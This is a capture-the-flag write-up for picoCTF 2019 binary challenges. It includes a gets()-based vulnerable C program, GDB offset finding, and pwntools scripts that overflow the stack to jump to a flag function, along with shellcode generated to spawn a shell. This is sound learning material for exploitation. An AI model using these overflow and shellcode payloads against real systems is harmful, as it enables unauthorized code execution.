## handy shellcode

We're given the source code:

![image1](/images/picoctf2019-handyshellcode/picoctf2019-handyshellcode1.png)

We have to send shellcode and the program will execute it, I made a python script that generates shellcode with the function `asm(shellcraft.linux.sh())`

![image2](/images/picoctf2019-handyshellcode/picoctf2019-handyshellcode3.png)

And execute it:

![image3](/images/picoctf2019-handyshellcode/picoctf2019-handyshellcode2.png)

<br/>

## practice run 1

You can make and ssh and cd to the directory and run it from there or just script it.

<br/>

```python
from pwn import *

user = ''
password = ''
host ='2019shell1.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e/run_this')

flag = p.recvline()
print(flag)
```

<br/>

## overflow 0

We're given the source code:

![image1](/images/picoctf2019-overflow0/picoctf2019-overflow01.png)

So if we overflow the argv we'll get the flag, here's the script, I only sent 200 a's

![image1](/images/picoctf2019-overflow0/picoctf2019-overflow02.png)

And execute it:

![image3](/images/picoctf2019-overflow0/picoctf2019-overflow03.png)

<br/>

## overflow 1

Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

<br/>

First let's find the offset, generate a cyclic pattern

```python
$ python3
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

Now let's open the binary on GDB and set a breakpoint before the programs exits and send the pattern
```bash
$ gdb vuln
(gdb)disass main
0x0804870f <+113>:   pop    %ebp
0x08048710 <+114>:   lea    -0x4(%ecx),%esp
0x08048713 <+117>:   ret
(gdb) break *0x08048713
Breakpoint 1 at 0x8048713
(gdb) r
Starting program: /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260/vuln 
Give me a string and lets see what happens: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Woah, were jumping to 0x61616174 !

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
```

And now find the offset

```python
>>> cyclic_find(0x61616174)
76
```

<br/>

Now get the address of vuln, I'll use objdump
```bash
objdump -d vuln | grep flag
```

<br/>

And now send the padding with the address of vuln

<br/>

```python
from pwn import *

user = ''
password = ''
host = '2019shell1.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260 && ./vuln')

payload = b'a'*76
payload += p32(0x080485e6) #objdump -d vuln | grep flag

p.recvuntil('Give me a string and lets see what happens: ')
p.sendline(payload)
p.interactive()	
```
